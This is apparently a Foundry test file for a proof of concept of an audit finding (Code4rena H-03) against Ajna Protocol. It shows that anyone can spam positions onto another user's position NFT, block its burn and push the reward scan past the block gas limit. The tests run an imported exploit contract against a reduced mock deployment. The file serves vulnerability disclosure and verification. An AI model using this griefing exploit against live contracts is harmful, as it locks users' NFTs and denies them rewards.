// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import "forge-std/Test.sol";
import "./20071-h-03-position-nft-can-be-spammed-with-insignificant-position.sol";

/*//////////////////////////////////////////////////////////////
    Ajna Protocol — [H-03] Position NFT can be spammed with
    insignificant positions by anyone until rewards DoS
    Finding 20071 (Code4rena 2023-05, reporter ToonVH) — HIGH

    memorializePositions() has no `mayInteract` (owner/approval) gate, so any
    third party can write attacker-chosen bucket indexes into ANY tokenId's
    positionIndexes set. Consequences proven here:
      (1) integrity  — a non-owner controls the victim's NFT position set;
      (2) liveness   — the owner can no longer burn the NFT (LiquidityNotRemoved);
      (3) rewards DoS — the O(n) reward-index scan grows with attacker-controlled
                        input; extrapolated to the buckets an attacker can attach,
                        it exceeds the 30M block gas limit → rewards uncomputable.

    The spam is performed in setUp() so the reward-index scan in the DoS test is
    measured against COLD storage (a fresh tx), exactly as a reward claim would
    hit it on-chain — not warmed by the spam tx.
//////////////////////////////////////////////////////////////*/
contract AjnaPositionSpamTest is Test {
    Exploit exp;
    PositionManager pm;
    uint256 tokenId;

    function setUp() public {
        exp = new Exploit();      // deploys reduced Ajna + sets up the victim NFT
        exp.run();                // permissionless spam + deterministic-harm assertions
        pm = exp.pm();
        tokenId = exp.tokenId();
    }

    function test_control_ownerAuthorizedButBloated_burnReverts() public {
        // Control: even the rightful owner cannot burn once positions exist —
        // proving the bloat (not an auth error) is what bricks burn.
        MockPool pool = new MockPool();
        PositionManager pm2 = new PositionManager();
        Victim victim = new Victim(pool, pm2);
        uint256 id = victim.setup(3);

        uint256[] memory idxs = victim.indexes();
        MemorializePositionsParams memory p = MemorializePositionsParams({tokenId: id, indexes: idxs});
        vm.prank(address(victim));
        pm2.memorializePositions(p);

        assertEq(pm2.getPositionIndexesLength(id), 3);
        victim.tryBurn(id);
        assertTrue(victim.lastBurnReverted(), "burn reverts while positions attached");
    }

    function test_spam_byAnyone_bricksNFT() public {
        // (1) integrity: a non-owner bloated the victim's NFT position set.
        assertEq(exp.bloatLength(), exp.N(), "attacker controlled the victim's positionIndexes");
        assertEq(pm.getPositionIndexesLength(tokenId), exp.N());
        assertFalse(pm.isApprovedOrOwner(address(exp), tokenId), "exploit was never authorized");

        // (2) liveness: the owner's burn is bricked by the unauthorized positions.
        assertTrue(exp.burnBricked(), "owner NFT is bricked for burning");
    }

    function test_rewards_DoS_coldScan_exceedsBlockGas() public {
        // (3) rewards DoS: measure the O(n) reward-index scan against COLD storage
        //     (this is a separate tx from the setUp() spam), then extrapolate to
        //     the buckets an attacker can attach to a single NFT.
        uint256 g0 = gasleft();
        pm.getPositionIndexesFiltered(tokenId);
        uint256 used = g0 - gasleft();
        uint256 perEntry = used / exp.N();
        uint256 estGas = perEntry * exp.MAX_FENWICK();

        emit log_named_uint("cold reward-scan gas for N sample", used);
        emit log_named_uint("cold per-entry gas", perEntry);
        emit log_named_uint("extrapolated gas at MAX_FENWICK buckets", estGas);

        assertGt(perEntry, 0, "measured per-entry cost");
        assertGt(estGas, exp.BLOCK_GAS_LIMIT(), "reward-index scan exceeds block gas limit -> permanent rewards DoS");
    }
}
